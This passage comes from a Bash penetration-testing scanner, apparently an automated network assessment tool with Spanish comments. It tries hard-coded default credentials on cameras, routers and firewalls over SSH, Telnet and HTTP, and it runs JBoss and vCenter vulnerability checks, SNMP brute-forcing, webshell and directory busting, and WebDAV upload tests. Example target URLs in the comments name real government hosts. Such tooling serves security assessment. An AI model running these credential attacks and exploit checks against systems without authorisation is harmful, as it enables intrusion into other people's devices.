	echo -e "$OKBLUE #################### dahua web (`wc -l servicios/dahua_camara.txt`) ######################$RESET"	    
	while read line     
	do     						
		echo -e "[+] Escaneando $line"	
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 
		echo -e "\t[+] Probando password por defecto"
		if [[ $port == "443" || $port == "8443"  ]]
		then
			$proxychains curl -d '{"method":"global.login","session":2033161537,"params":{"userName":"admin","password":"E1C68AE9E791F6280431E76B7E245A5C","clientType":"Web3.0"},"id":10000}' -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0" -H "Accept: text/javascript, text/html, application/xml, text/xml, */*" -H "X-Requested-With: XMLHttpRequest" -H "X-Request: JSON" -X POST https://$ip:$port/RPC2_Login > logs/vulnerabilidades/"$ip"_"$port"_passwordDahua.txt 2>/dev/null		 	
		else
			$proxychains curl -d '{"method":"global.login","session":2033161537,"params":{"userName":"admin","password":"E1C68AE9E791F6280431E76B7E245A5C","clientType":"Web3.0"},"id":10000}' -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0" -H "Accept: text/javascript, text/html, application/xml, text/xml, */*" -H "X-Requested-With: XMLHttpRequest" -H "X-Request: JSON" -X POST http://$ip:$port/RPC2_Login > logs/vulnerabilidades/"$ip"_"$port"_passwordDahua.txt 2>/dev/null
		fi
		
		egrep -iq "true" logs/vulnerabilidades/"$ip"_"$port"_passwordDahua.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then	
			echo "$line Usuario:admin Password:admin" >.vulnerabilidades/"$ip"_"$port"_passwordDahua.txt		
		fi
				
 	done <servicios/dahua_camara.txt	
	insert_data
fi
	
		
			
# pfsense default password
if [ -f servicios/pfsense.txt ]
then
	echo -e "$OKBLUE #################### pfsense (`wc -l servicios/pfsense.txt`) ######################$RESET"	    
	while read line     
	do     						
		echo -e "[+] Escaneando $line"	
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	

		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			$proxychains medusa -h $ip -u admin -p pfsense -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Pfsense] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
			fi
		fi					
						
		echo ""
 	done <servicios/pfsense.txt	
	insert_data
fi

# JBOSS
if [ -f servicios/jboss.txt ]
then
	echo -e "$OKBLUE #################### jboss (`wc -l servicios/jboss.txt`) ######################$RESET"	    
	while read line
	do     						
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		echo -e "[+] Escaneando $ip : $port"	
		if [[ $port == "443" || $port == "8443"  ]]
		then 
			echo "jexboss.sh --disable-check-updates -u \"https://$line\"" > logs/vulnerabilidades/"$ip"_"$port"_jbossVuln.txt
			$proxychains jexboss.sh --disable-check-updates -u "https://$line" >> logs/vulnerabilidades/"$ip"_"$port"_jbossVuln.txt
		else
			echo "jexboss.sh --disable-check-updates -u \"http://$line\""  > logs/vulnerabilidades/"$ip"_"$port"_jbossVuln.txt		
			$proxychains jexboss.sh --disable-check-updates -u "http://$line"  > logs/vulnerabilidades/"$ip"_"$port"_jbossVuln.txt		
		fi
						
		egrep --color=never "VULNERABLE|EXPOSED|INCONCLUSIVE" logs/vulnerabilidades/"$ip"_"$port"_jbossVuln.txt > .vulnerabilidades/"$ip"_"$port"_jbossVuln.txt
		echo ""
 	done <servicios/jboss.txt	
	insert_data
fi


# Netgear default password
if [ -f servicios/Netgear.txt ]
then
	echo -e "$OKBLUE #################### Netgear (`wc -l servicios/Netgear.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p 1234 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -e n -u admin -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Netgear] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			fi						
			
		fi		

		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p 1234 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -e n -u admin -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Netgear] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
			fi
			
		fi					
				
		
		echo ""
 	done <servicios/Netgear.txt	
	insert_data
fi


# linksys default password
if [ -f servicios/linksys.txt ]
then
	echo -e "$OKBLUE #################### linksys (`wc -l servicios/linksys.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p password -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -h $ip -u root -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -e n -u linksys -h $ip -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Linksys] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			fi	
			
		fi		

		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u admin -p password -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -h $ip -u root -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -e n -u linksys -h $ip -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[Linksys] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
			fi
		fi					
						
		echo ""
 	done <servicios/linksys.txt	
	insert_data
fi





# d-link default password
if [ -f servicios/d-link.txt ]
then
	echo -e "$OKBLUE #################### d-link (`wc -l servicios/d-link.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -h $ip -u 1234 -p 1234 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -h $ip -u root -p 12345 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -h $ip -u root -p root -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[D-link] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			fi	
			
			
		fi		

		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -h $ip -u 1234 -p 1234 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -h $ip -u root -p 12345 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			$proxychains medusa -h $ip -u root -p root -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[D-link] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
			fi
		fi					
				
		
		echo ""
 	done <servicios/d-link.txt
	insert_data
fi




# VMWARE vCenter
if [ -f servicios/vCenter.txt ]
then
	echo -e "$OKBLUE #################### vCenter (`wc -l servicios/vCenter.txt`) ######################$RESET"	    
	while read line     
	do     						
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"` 	
		echo -e "[+] Escaneando $ip $port"	
		
		$proxychains vCenter.py --url https://$ip -n 8 --check > logs/vulnerabilidades/"$ip"_"$port"_vCenter.txt
		grep --color=never -i "vulnerable" logs/vulnerabilidades/"$ip"_"$port"_vCenter.txt > .vulnerabilidades/"$ip"_"$port"_vCenter.txt							
						
		echo ""
 	done <servicios/vCenter.txt
	insert_data
fi


# ZTE default password
if [ -f servicios/ZTE.txt ]
then
	echo -e "$OKBLUE #################### ZTE (`wc -l servicios/ZTE.txt`) ######################$RESET"	    
	while read ip     
	do     						
		echo -e "[+] Escaneando $ip"	
		
		egrep -iq "23/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando Telnet \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u zte -p zte -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u ZXDSL -p ZXDSL -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u user -p user -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u on -p on -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u root -p Zte521 -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u root -p 'W!n0&oO7.' -M telnet >> logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt 2>/dev/null			
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_23_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[ZTE] $respuesta" >> .vulnerabilidades/"$ip"_23_passwordDefecto.txt
			fi	
		fi
		#exploit 
		#sendcmd 1 DB p DevAuthInfo

		egrep -iq "22/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando SSH \n $RESET"
			$proxychains medusa -h $ip -u admin -p admin -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u zte -p zte -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u ZXDSL -p ZXDSL -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u user -p user -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u on -p on -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u root -p Zte521 -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			$proxychains medusa -h $ip -u root -p 'W!n0&oO7.' -M ssh >> logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt 2>/dev/null
			respuesta=`grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordDefecto.txt `
			greprc=$?
			if [[ $greprc -eq 0 ]] ; then
				echo -n "[ZTE] $respuesta" >> .vulnerabilidades/"$ip"_22_passwordDefecto.txt
			fi
		
		fi
		#exploit 
		#sendcmd 1 DB p DevAuthInfo	
		
		
		egrep -iq "80/open" .escaneo_puertos_banners/"$ip".grep
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t Probando HTTP \n $RESET"	
			echo "user" > pass.txt
			$proxychains passWeb.pl -t $ip -p 80 -d / -m zte -u user -f pass.txt  > logs/vulnerabilidades/"$ip"_80_passwordDefecto.txt 2>/dev/null
			grep "Password encontrado" logs/vulnerabilidades/"$ip"_80_passwordDefecto.txt > .vulnerabilidades/"$ip"_80_passwordDefecto.txt 2>/dev/null
		fi					
						
		echo ""
 	done <servicios/ZTE.txt
	
	insert_data
fi

# unificar servicios snmp
cat servicios/snmp2.txt servicios/linksys.txt servicios/Netgear.txt servicios/pfsense.txt servicios/ubiquiti.txt servicios/mikrotik.txt servicios/NetScreen.txt  servicios/fortinet.txt servicios/cisco.txt  servicios/ciscoASA.txt servicios/3com.txt 2>/dev/null | sort | uniq > servicios/snmp.txt; rm servicios/snmp2.txt  2>/dev/null
find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # borrar archivos vacios

	echo -e "$OKBLUE #################### SNMP  ######################$RESET"	    	
	echo -e "\t[+] Probando comunity string comunes"
	$proxychains onesixtyone -c /usr/share/lanscanner/community.txt -i .datos/total-host-vivos.txt > logs/enumeracion/dispositivos-snmp.txt
	sed 's/] 1/] \n1/g' -i logs/enumeracion/dispositivos-snmp.txt	# corregir error de onesixtyone
	cat logs/enumeracion/dispositivos-snmp.txt | grep --color=never "\[" | sed 's/ \[/~/g' |  sed 's/\] /~/g' | sort | sort | uniq > logs/enumeracion/dispositivos-snmp-detalle.txt
	

	while read line; do					
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			snmp_instancias=$((`ps aux | egrep 'snmpwalk|snmpbrute' | wc -l` - 1)) 
			if [[ $free_ram -gt $min_ram && $snmp_instancias -lt 20  ]];then 	
				ip=`echo $line | cut -f1 -d"~"`
				community=`echo $line | cut -f2 -d"~"`
				device=`echo $line | cut -f3 -d"~"`
		
				echo -e "\t[i] Dispositivo identificado: $device ($ip)"
				echo -e "\t[+] Enumerando con el comunity string: $community"
				
				###### Revisar si no es impresora ######				
				if [[ (  ${device} == *"RICOH"* || ${device} == *"Printer"* || ${device} == *"JetDirect"*  || ${device} == *"LaserJet"* || ${device} == *"KONICA"* || ${device} == *"MULTI-ENVIRONMENT"* ) || (  -e ".vulnerabilidades/"$ip"_161_snmpCommunity.txt" )]];then 
					echo -e "\t$OKGREEN[i] Es una impresora o ya fue enumerado $RESET"
					echo ""
				else
					
					### snmp write ##
					$proxychains snmp-write.pl -t $ip -c $community >> logs/vulnerabilidades/"$ip"_161_snmpCommunity.txt	 2>/dev/null
					echo "" >>	logs/vulnerabilidades/"$ip"_161_snmpCommunity.txt	 2>/dev/null
				
					### snmp enumerate ##
					
					shopt -s nocasematch #ignorar mayusculas
					case "$device" in
					*"windows"*)
						echo -e "\t\t[+] Enumerando como dispositivo windows"
						$proxychains snmpbrute.py --target $ip --community $community --windows --auto >> logs/vulnerabilidades/"$ip"_161_snmpCommunity.txt 2>/dev/null &
						echo ""
						;;
					*"linux"* )
						echo -e "\t\t[+] Enumerando como dispositivo Linux" 
						$proxychains snmpbrute.py --target $ip --community $community --linux --auto >> logs/vulnerabilidades/"$ip"_161_snmpCommunity.txt 2>/dev/null 	&
						echo ""
						;;
					'ubuntu')
						echo -e "\t\t[+] Enumerando como dispositivo Linux" 
						$proxychains snmpbrute.py --target $ip --community $community --linux --auto >> logs/vulnerabilidades/"$ip"_161_snmpCommunity.txt 2>/dev/null 	&
						echo ""
						;;
					*) 
						echo -e "\t\t[+] Enumerando como dispositivo cisco" 			
						$proxychains snmpbrute.py --target $ip --community $community --cisco --auto >> logs/vulnerabilidades/"$ip"_161_snmpCommunity.txt 2>/dev/null &
						echo ""
					esac				
					sleep 1										
				fi		
				#######################		
				$proxychains  snmpwalk -v2c -c $community $ip .1 > logs/vulnerabilidades/"$ip"_161_snmpwalk.txt 2>/dev/null &
				break
			
			else
				snmp_instancias=`ps aux | egrep 'snmpwalk|snmpbrute' | wc -l`
				echo -e "\t[-] Poca RAM ($free_ram Mb) ó maximo número de instancias de snmpwalk ($snmp_instancias) "
				sleep 3
			fi					
		done
	done < logs/enumeracion/dispositivos-snmp-detalle.txt
#	rm banners-snmp2.txt	

	######## wait to finish########
	while true; do
		snmp_instancias=$((`ps aux | egrep 'snmpwalk|snmpbrute' | wc -l` - 1)) 
	if [ "$snmp_instancias" -gt 0 ]
		then
			echo -e "\t[i] Todavia hay escaneos de snmpwalk activos ($snmp_instancias)"  
			sleep 30
		else
			break		  		 
		fi				
	done
	##############################

	cp logs/vulnerabilidades/*_161_snmpCommunity.txt .vulnerabilidades/ 2>/dev/null
	cp logs/vulnerabilidades/"$ip"_161_snmpwalk.txt 2>/dev/null .vulnerabilidades/"$ip"_161_snmpwalk.txt 2>/dev/null 
	insert_data
	##################################


# revisar si hay scripts ejecutandose (web-buster de directorios)
while true; do
	webbuster_instancias=`ps aux | egrep 'buster' | wc -l`		
	if [ "$webbuster_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($webbuster_instancias)"				
		sleep 10
	else
		break		
	fi
done	# done true	

##########  Filtrar los directorios que respondieron 200 OK (llevarlos a .enumeracion) ################
echo -e "$OKBLUE [i] Filtrar los directorios descubiertos que respondieron 200 OK (llevarlos a .enumeracion) $RESET"	    
touch logs/enumeracion/canary_webdirectorios.txt # se necesita al menos 2 archivos *_webdirectorios.txt
egrep --color=never "^200|^401" logs/enumeracion/*webdirectorios.txt 2>/dev/null| while read -r line ; do	
	#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
    archivo_origen=`echo $line | cut -d ':' -f1`
    contenido=`echo $line | cut -d ':' -f2-6`    
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/logs\/enumeracion/.enumeracion}   	    
    #200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
    #echo "contenido $contenido"
    echo $contenido >> $archivo_destino        
done
insert_data
#####################################################################################################


if [ "$PROXYCHAINS" == "n" && "$internet" == 'n' ]; then 	
	IFS=$'\n'  # make newlines the only separator
	echo -e "$OKBLUE #################### Realizar escaneo de directorios (2do nivel) a los directorios descubiertos ######################$RESET"	    
	for line in $(cat .enumeracion2/*webdirectorios.txt 2>/dev/null | uniq ); do	
		echo -e "\n\t########### $line #######"										
		#line= 200	https://inscripcion.notariadoplurinacional.gob.bo:443/manual/ (Listado directorio activo)	 ,
		while true; do
			free_ram=`free -m | grep -i mem | awk '{print $7}'`		
			perl_instancias=$((`ps aux | grep perl | wc -l` - 1)) 		
			if [[ $free_ram -gt $min_ram  && $perl_instancias -lt $max_perl_instancias  ]]
			then
				if [[ ${line} != *"Listado directorio"*  &&  ${line} != *"wp-"* &&  ${line} != *".action"*  ]] ; then
					proto=`echo $line | cut -d ":" -f 1 | cut -d ' ' -f2` #  http/https
					ip_port=`echo $line | cut -d "/" -f 3` # 190.129.69.107:80							
					ip=`echo $ip_port | cut -d ":" -f 1` #puede ser subdominio tb
					port=`echo $ip_port | cut -d ":" -f 2`		
					path=`echo $line | cut -d "/" -f4 | tr '[:upper:]' '[:lower:]'` #minuscula
				tom
						if [[ (${path} != *"xmlrpc"* && ${path} != *"manual"* && ${path} != *"dashboard"* && ${path} != *"docs"* && ${path} != *"license"* && ${path} != *"wp"* && ${path} != *"aspnet_client"*  && ${path} != *"autodiscover"*  && ${line} != *"manager/html"* && ${path} != *"manual"* && ${path} != *"manual"* ) ]];then 
						echo -e "\t\t[+] Enumerando directorios de 2do nivel ($path)" 
						web-buster.pl -t $ip -p $port -s $proto -h $hilos_web -d "/$path/" -m folders >> logs/enumeracion/"$ip"_"$port"_webdirectorios2.txt &
											
						web-buster.pl -t $ip -p $port -s $proto -h $hilos_web -d "/$path/" -m archivosPeligrosos -o 0 | egrep --color=never "^200" >> .vulnerabilidades/"$ip"_"$port"_archivosPeligrosos.txt &

						#TODO
						#curl -F "files=@/usr/share/lanscanner/info.php" http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php > logs/vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt
						#grep "info.php" logs/vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt > .vulnerabilidades/"$ip"_"$port"_jqueryUpload.txt
		
						egrep -i "apache|nginx" .enumeracion2/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" # solo el segundo egrep poner "-q"
						greprc=$?				
						if [[ $greprc -eq 0 ]];then # si el banner es Apache
							web-buster.pl -t $ip -p $port -s $proto -h $hilos_web -d "/$path/" -m backdoorApache  -o 0 | egrep --color=never "^200"  >> .vulnerabilidades/"$ip"_"$port"_webshell.txt &
						fi	
					else
						echo -e "\t[-] No vale la pena escanear este directorio "
					fi				
					sleep 1
				else
					echo -e "\t[-] El listado de directorios esta activo o es un directorio de wordpress "
				fi #revisar q el listado de directorio esta habilitado
				
				break		
			else				
				perl_instancias=`ps aux | grep perl | wc -l`
				echo -e "\t[-] Maximo número de instancias de perl ($perl_instancias) RAM = $free_ram Mb"
				sleep 3									
			fi	
		done #while				
	done #for
		
fi  

# revisar si hay scripts ejecutandose
while true; do
	webbuster_instancias=`ps aux | egrep 'wampServer|joomscan|wpscan|buster|enum4linux' | wc -l`		
	if [ "$webbuster_instancias" -gt 1 ]
	then
		echo -e "\t[i] Todavia hay scripts activos ($webbuster_instancias)"				
		sleep 10
	else
		break		
	fi
done	# done true	



#Revisar logs despues de que acabe escaneo
if [ -f servicios/servers.txt ]
then

	echo -e "$OKBLUE #################### Revisar logs  Servers (`wc -l servicios/servers.txt`)######################$RESET"	    
	while read ip       
	do     	
		echo "checking IP $ip "		
		egrep -iq "Server doesn't allow session|RID cycling not possible" logs/vulnerabilidades/"$ip"_445_enum4linux.txt 
		greprc=$?
		if [[ $greprc -eq 0  ]];then
			echo -e "\t[-] No Null session "
		else
			echo -e "\t[+] Null session detected"
			grep --color=never -i  "Group" logs/vulnerabilidades/"$ip"_445_enum4linux.txt  >> .vulnerabilidades/"$ip"_445_enum4linux.txt
			grep --color=never -i  "User" logs/vulnerabilidades/"$ip"_445_enum4linux.txt  >> .vulnerabilidades/"$ip"_445_enum4linux.txt			

			grep -a '\-1000' .vulnerabilidades/"$ip"_445_enum4linux.txt | cut -d '\' -f2 | cut -d " " -f1 >> .enumeracion/"$ip"_445_users.txt
			grep -a '\-1001' .vulnerabilidades/"$ip"_445_enum4linux.txt | cut -d '\' -f2 | cut -d " " -f1 >> .enumeracion/"$ip"_445_users.txt
			grep -a '\-1002' .vulnerabilidades/"$ip"_445_enum4linux.txt | cut -d '\' -f2 | cut -d " " -f1 >> .enumeracion/"$ip"_445_users.txt
			grep -a '\-1003' .vulnerabilidades/"$ip"_445_enum4linux.txt | cut -d '\' -f2 | cut -d " " -f1 >> .enumeracion/"$ip"_445_users.txt
			grep -a '\-3000' .vulnerabilidades/"$ip"_445_enum4linux.txt | cut -d '\' -f2 | cut -d " " -f1 >> .enumeracion/"$ip"_445_users.txt
			grep -a '\-3001' .vulnerabilidades/"$ip"_445_enum4linux.txt | cut -d '\' -f2 | cut -d " " -f1 >> .enumeracion/"$ip"_445_users.txt
			grep -a '\-3002' .vulnerabilidades/"$ip"_445_enum4linux.txt | cut -d '\' -f2 | cut -d " " -f1 >> .enumeracion/"$ip"_445_users.txt
		fi			
	done <servicios/servers.txt
fi

	
	

##########  filtrar los directorios de segundo nivel que respondieron 200 OK (llevarlos a .enumeracion) ################
touch logs/enumeracion/canary_webdirectorios2.txt # se necesita al menos 2 archivos *_webdirectorios2.txt
echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web (directorios de segundo nivel)"
egrep --color=never "^200" logs/enumeracion/*webdirectorios2.txt 2>/dev/null| while read -r line ; do	
	#line = 200	http://sigec.ruralytierras.gob.bo:80/login/index/
	#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
    archivo_origen=`echo $line | cut -d ':' -f1`
    contenido=`echo $line | cut -d ':' -f2-6`    
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/logs\/enumeracion/.enumeracion}   	    
    #200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
    #echo "contenido $contenido"
    echo $contenido >> $archivo_destino        
done
insert_data
#####################################################################################################

echo -e "[i] Revisar vulnerabilidades relacionadas a aplicaciones web"
############ vulnerabilidades relacionados a servidores/aplicaciones web ########

########## test debug ###
egrep -i "Debug habilitado" .enumeracion2/* 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Debug habilitado $RESET"
    archivo_origen=`echo $line | cut -d ':' -f1`
    # .enumeracion2/181.115.186.245_"$port"_webData.txt:~~~~ ~~~~~~Debug habilitado~~
    url_debug=${archivo_origen/_webData.txt/} #   $archivo_origen
    url_debug=${url_debug/.enumeracion2\//}   	
    url_debug=${url_debug/_/:}"/nonexistroute123"    	
    
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webData/debugHabilitado}   	
    contenido=`echo $line | cut -d ':' -f2-4`    
    echo $url_debug >> $archivo_destino 
	echo "" >> $archivo_destino
	curl $url_error | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10 >> $archivo_destino  
done
#################################
	

########## revisando PROPFIND (webdav) ###
grep PROPFIND .escaneo_puertos_banners/* | grep risky 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Método PROPFIND detectado $RESET"
    archivo_origen=`echo $line | cut -d ':' -f1` # .escaneo_puertos_banners/10.11.1.14.txt
	ip_webdav=`echo $archivo_origen | cut -d "/" -f2 | cut -d "." -f1-4`	
	#cp $archivo_origen
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.escaneo_puertos_banners/.enumeracion}
	archivo_destino=${archivo_destino/.txt/_web_webdav.txt}	
    contenido=`echo $line | cut -d '|' -f2`    
	echo $contenido >> $archivo_destino

	davtest -url http://$ip_webdav/ >> logs/vulnerabilidades/"$ip_webdav"_"80"_webdav.txt
	davtest -url https://$ip_webdav/ >> logs/vulnerabilidades/"$ip_webdav"_"443"_webdav.txt

	grep SUCCEED logs/vulnerabilidades/"$ip_webdav"_"443"_webdav.txt > .vulnerabilidades/"$ip_webdav"_"443"_webdav.txt
	grep SUCCEED logs/vulnerabilidades/"$ip_webdav"_"80"_webdav.txt >  .vulnerabilidades/"$ip_webdav"_"80"_webdav.txt

done
#################################

########## revisando exposicion de usuarios ###
#En directorios descubiertos
grep "Exposicion de usuario" .enumeracion2/* 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Exposicion de usuarios detectado $RESET"		
    archivo_origen=`echo $line | cut -d ':' -f1`
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webdirectorios/exposicionUsuarios}   	
